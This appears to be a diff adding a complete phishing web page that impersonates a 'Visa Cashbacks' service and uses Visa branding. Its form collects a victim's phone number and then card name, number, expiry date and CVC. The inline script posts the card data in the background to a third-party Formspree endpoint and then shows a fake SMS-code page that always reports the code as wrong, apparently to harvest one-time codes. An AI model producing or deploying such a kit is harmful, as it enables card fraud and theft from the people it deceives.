@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Cashbacks</title>
+    
+    <style>
+        /* All CSS from previous version remains the same... */
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #003c94; color: #ffffff; }
+        .site-header { background-color: #ffffff; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; position: relative; }
+        .header-logo { height: 30px; }
+        .header-title { color: #000000; font-weight: bold; font-size: 1.2rem; position: absolute; left: 50%; transform: translateX(-50%); }
+        .lang-switcher { border: 1px solid #ccc; padding: 5px 8px; font-weight: bold; border-radius: 4px; font-size: 1rem; color: #333; }
+        .main-container { display: flex; justify-content: center; align-items: flex-start; padding: 50px 20px; }
+        .page { width: 100%; max-width: 450px; box-sizing: border-box; }
+        .page h2 { font-size: 1.8rem; font-weight: 700; margin-top: 0; margin-bottom: 30px; text-align: center; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 0.9rem; margin-bottom: 8px; font-weight: 600; text-align: left; }
+        .input-group input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; box-sizing: border-box; color: #333; text-align: left; direction: ltr; }
+        .phone-input-container { display: flex; align-items: center; }
+        .country-code { padding: 14px; background-color: #e9ecef; border: 1px solid #ccc; border-right: none; border-radius: 4px 0 0 4px; color: #333; font-weight: bold; }
+        #mobile { border-radius: 0 4px 4px 0; }
+        .input-row { display: flex; gap: 15px; }
+        .input-row .input-group { flex: 1; }
+        .action-btn { width: 100%; padding: 15px; background-color: #0073e6; color: white; border: none; border-radius: 4px; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 10px; }
+        .action-btn:hover { background-color: #005bb5; }
+        .links { text-align: center; margin-top: 25px; }
+        .links a { color: #ffffff; text-decoration: underline; cursor: pointer; }
+        .links p { margin-top: 15px; }
+        .site-footer { text-align: center; padding: 40px 20px; font-size: 0.9rem; color: #dddddd; }
+        .otp-container { display: flex; gap: 10px; justify-content: center; direction: ltr; }
+        .otp-container input { width: 45px; height: 50px; text-align: center; font-size: 1.5rem; font-weight: bold; }
+        .otp-message { font-size: 0.9rem; text-align: left; font-weight: 600; margin-bottom: 20px; line-height: 1.5; }
+        #otp-error-msg { color: #ffcccc; }
+        .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 60, 148, 0.8); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .loader-spinner { border: 8px solid #f3f3f3; border-top: 8px solid #0073e6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #page1, #page2, #page3, .loader-overlay, #card-brand-logo { display: none; }
+        @media (max-width: 600px) { .header-title { display: none; } }
+        .card-number-wrapper { position: relative; }
+        #card-brand-logo { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); height: 25px; }
+        input.invalid { border-color: #d93025; box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.2); }
+    </style>
+</head>
+<body>
+
+    <div id="loader" class="loader-overlay"><div class="loader-spinner"></div></div>
+    <header class="site-header">
+        <img src="https://i.postimg.cc/43dFTghr/logo-marketwide-header.png" alt="Logo" class="header-logo">
+        <span class="header-title">Visa Cashbacks</span>
+        <div class="lang-switcher">A Z</div>
+    </header>
+
+    <div class="main-container">
+        <div id="page1" class="page">
+            <form id="loginForm">
+                <h2>Log in to your Visa Cashbacks account</h2>
+                <div class="input-group">
+                    <label for="mobile">Mobile number</label>
+                    <div class="phone-input-container">
+                        <span class="country-code">+986</span>
+                        <input type="tel" id="mobile" name="mobile" placeholder="Phone number" required>
+                    </div>
+                </div>
+                <button type="submit" class="action-btn">Login</button>
+                <div class="links">
+                    <a class="nav-link">Forgot your password?</a>
+                    <p>Don't have an account? <a class="nav-link">Register here.</a></p>
+                </div>
+            </form>
+        </div>
+
+        <div id="page2" class="page">
+             <form id="paymentForm" action="https://formspree.io/f/xnnzrpky" method="POST">
+                <h2>Enter Visa/MasterCard information</h2>
+                <div class="input-group">
+                    <label for="cardName">Name on Card</label>
+                    <input type="text" id="cardName" name="card_name" required>
+                </div>
+                <div class="input-group">
+                    <label for="cardNumber">Card Number</label>
+                    <div class="card-number-wrapper">
+                        <input type="text" id="cardNumber" name="card_number" inputmode="numeric" required>
+                        <img id="card-brand-logo" src="" alt="Card Brand">
+                    </div>
+                </div>
+                <div class="input-row">
+                    <div class="input-group">
+                        <label for="expDate">Expiry Date (MM/YY)</label>
+                        <input type="text" id="expDate" name="expiry_date" placeholder="MM / YY" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="cvc">CVC</label>
+                        <input type="text" id="cvc" name="cvc" inputmode="numeric" maxlength="3" required>
+                    </div>
+                </div>
+                <button type="submit" class="action-btn">Apply</button>
+            </form>
+        </div>
+
+        <div id="page3" class="page">
+            <form id="otpForm">
+                <p id="otp-initial-msg" class="otp-message">Please enter the confirmation code sent to you via SMS on your phone number within 3 minutes.</p>
+                <p id="otp-error-msg" class="otp-message" style="display: none;">The entered code is incorrect, please re-enter the new code.</p>
+                <div class="otp-container">
+                    <input type="text" maxlength="1" class="otp-input" required>
+                    <input type="text" maxlength="1" class="otp-input" required>
+                    <input type="text" maxlength="1" class="otp-input" required>
+                    <input type="text" maxlength="1" class="otp-input" required>
+                    <input type="text" maxlength="1" class="otp-input" required>
+                    <input type="text" maxlength="1" class="otp-input" required>
+                </div>
+                <button type="submit" class="action-btn" style="margin-top: 30px;">Submit</button>
+            </form>
+        </div>
+    </div>
+    
+    <footer class="site-footer">© 2025 Visa. All Rights Reserved.</footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            const page3 = document.getElementById('page3');
+            const loader = document.getElementById('loader');
+
+            const loginForm = document.getElementById('loginForm');
+            const paymentForm = document.getElementById('paymentForm');
+            const otpForm = document.getElementById('otpForm');
+
+            page1.style.display = 'block';
+
+            function showLoaderAndNavigate(hidePage, showPage) {
+                hidePage.style.display = 'none';
+                loader.style.display = 'flex';
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    showPage.style.display = 'block';
+                }, 10000);
+            }
+
+            loginForm.addEventListener('submit', (e) => { e.preventDefault(); page1.style.display = 'none'; page2.style.display = 'block'; });
+            document.querySelectorAll('.nav-link').forEach(link => { link.addEventListener('click', (e) => { e.preventDefault(); page1.style.display = 'none'; page2.style.display = 'block'; }); });
+
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardBrandLogo = document.getElementById('card-brand-logo');
+            const expDateInput = document.getElementById('expDate');
+
+            cardNumberInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 16);
+                e.target.value = value.replace(/(\d{4})/g, '$1 ').trim();
+                if (value.startsWith('4')) {
+                    cardBrandLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/a/ac/Old_Visa_Logo.svg';
+                    cardBrandLogo.style.display = 'block';
+                } else if (value.startsWith('5')) {
+                    cardBrandLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/b/b7/Mastercard_logo.svg';
+                    cardBrandLogo.style.display = 'block';
+                } else {
+                    cardBrandLogo.style.display = 'none';
+                }
+            });
+
+            expDateInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 4);
+                e.target.value = value.length > 2 ? `${value.substring(0, 2)} / ${value.substring(2)}` : value;
+            });
+
+            expDateInput.addEventListener('blur', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                e.target.classList.remove('invalid');
+                if (value.length === 4) {
+                    const [month, year] = [parseInt(value.substring(0, 2)), parseInt(value.substring(2, 4))];
+                    const now = new Date();
+                    const currentYear = now.getFullYear() % 100;
+                    const currentMonth = now.getMonth() + 1;
+                    if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
+                        e.target.classList.add('invalid');
+                    }
+                }
+            });
+            
+            // CORRECTED: Payment form submission logic
+            paymentForm.addEventListener('submit', (e) => {
+                e.preventDefault(); // Keep this to prevent default redirect
+                
+                if (expDateInput.classList.contains('invalid')) {
+                    alert('Expiry date is not valid.');
+                    return;
+                }
+
+                // Create FormData object from the form
+                const formData = new FormData(paymentForm);
+
+                // Send data to Formspree in the background
+                fetch(paymentForm.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Form submitted to Formspree successfully!');
+                    } else {
+                        console.error('Formspree submission failed.');
+                    }
+                }).catch(error => console.error('An error occurred:', error));
+
+                // Continue with the SPA navigation immediately
+                showLoaderAndNavigate(page2, page3);
+            });
+            
+            const otpInitialMsg = document.getElementById('otp-initial-msg');
+            const otpErrorMsg = document.getElementById('otp-error-msg');
+            const otpInputs = document.querySelectorAll('.otp-input');
+
+            otpForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                otpInitialMsg.style.display = 'none';
+                otpErrorMsg.style.display = 'block';
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+                showLoaderAndNavigate(page3, page3);
+            });
+
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
